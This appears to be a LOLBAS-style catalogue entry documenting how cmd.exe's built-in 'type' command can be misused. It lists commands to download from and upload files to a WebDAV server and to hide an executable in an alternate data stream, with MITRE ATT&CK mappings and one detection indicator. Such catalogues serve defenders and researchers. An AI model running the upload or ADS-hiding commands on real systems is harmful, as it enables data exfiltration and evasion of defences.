---
Name: Type (Built in command within cmd.exe)
Description: Type is a built in command for cmd.exe used to displays the content of a file. 
Author: 'Mr.0range'
Created: 2022-12-09
Commands:
  - Command: type \\webdav-server\folder\file.ext > C:\Path\file.ext
    Description: Downloads a specified file from a WebDAV server to the target file.
    Usecase: Download/copy a file from a WebDAV server
    Category: Download
    Privileges: User
    MitreID: T1105
    OperatingSystem: Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
  - Command: type C:\Path\file.ext > \\webdav-server\folder\file.ext
    Description: Uploads a specified file to a WebDAV server.
    Usecase: Upload a file to a WebDAV server
    Category: Upload
    Privileges: User
    MitreID: T1048.003
    OperatingSystem: Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
  - Command: type C:\Path\file.exe > C:\Path\file.txt:file.exe
    Description: File.exe is copied to an Alternate Data Stream (ADS) of the file.txt file
    Usecase: Add a file to an alternate data stream to hide from defensive countermeasures
    Category: ADS
    Privileges: User
    MitreID: T1564.004
    OperatingSystem: Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
  - Command: type C:\Path\file.txt > C:\New-Path\New-file.txt
    Description: Copies file.txt by redirecting the output of type into a new file.
    Usecase: Copying a file
    Category: Copy
    Privileges: User
    MitreID: T1105
    OperatingSystem: Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
Full_Path:
  - Path: C:\Windows\System32\cmd.exe
  - Path: C:\Windows\SysWOW64\cmd.exe
Code_Sample:
  - Code: 
Detection:
  - IOC: cmd.exe creating/modifying file contents in an alternate data stream.
